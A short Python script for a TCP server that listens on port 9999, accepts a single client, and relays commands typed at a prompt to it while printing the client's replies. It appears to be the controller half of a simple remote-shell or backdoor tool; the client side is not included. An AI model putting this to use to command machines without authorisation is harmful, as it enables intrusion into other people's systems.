import socket
import sys
import select

# Initializing a server socket


def create_socket():
    try:
        global port
        global host
        global s
        port = 9999
        host = ""
        s = socket.socket()
        print("socket created!")
    except socket.error as e:
        print("Socket creation error", e)


# binding the socket and listening to connections
def bind_socket():
    try:
        global port
        global host
        global s
        print("Binding with port :", port)

        s.bind((host, port))
        s.listen()

        print("Port Binded")
    except socket.error as e:
        print("Socket Binding Error", e)
        bind_socket()


# Accepting the connection from client (socket must be listening)
def socket_accept():
    conn, address = s.accept()
    print(
        f"Connection has been established :: IP : {address[0]} | PORT : {str(address[1])}")
    # send command to client
    send_command(conn)
    conn.close()

# send commands to client


def send_command(conn):
    while True:
        cmd = input(">>")

        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()

        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))

            resp_data = ""
            client_resp = str(conn.recv(1024), "utf-8")

            while len(client_resp) == 1024:
                resp_data += client_resp
                client_resp = str(conn.recv(1024), "utf-8")
            else:
                resp_data += client_resp                
            
            # print(len(client_resp))
            # print("Response from client : " + resp_data)
            print(len(resp_data))
            print(resp_data)


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()